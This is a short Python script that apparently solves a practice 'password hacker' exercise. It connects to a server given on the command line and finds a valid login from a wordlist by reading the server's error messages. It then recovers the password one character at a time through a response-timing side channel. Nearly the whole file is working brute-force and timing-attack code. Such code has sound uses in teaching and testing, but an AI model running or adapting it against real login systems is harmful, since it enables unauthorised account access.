import sys
import socket
import string
import json
import time


# getting arguments from command line
host, port = sys.argv[1:]
address = (host, int(port))
dictionary = string.ascii_letters + string.digits


def get_login():
    with open(r'C:\Users\Mirjahon\Downloads\logins.txt') as f:
        for name in f.read().split('\n'):
            yield name


def find_login(client):
    for name in get_login():
        body = json.dumps({
            'login': name,
            'password': ''
        })
        client.send(body.encode())
        responce = json.loads(client.recv(1024).decode())
        if responce['result'] == 'Wrong password!':
            return name


def generate_password(beginning):
    for char in dictionary:
        yield beginning + char


def find_password(client, login):
    start = ''
    n = 0
    while True:
        passwords = generate_password(start)
        for password in passwords:
            body = json.dumps({
                'login': login,
                'password': password
            })
            start_time = time.perf_counter()
            client.send(body.encode())
            responce = json.loads(client.recv(1024).decode())
            end_time = time.perf_counter()
            if responce['result'] == 'Connection success!':
                return password
            else:
                if end_time - start_time >= 0.1:
                    start = password
                    break


with socket.socket() as cl:
    cl.connect(address)
    login = find_login(cl)
    password = find_password(cl, login)
    print(json.dumps({
        "login": login,
        "password": password
    }))

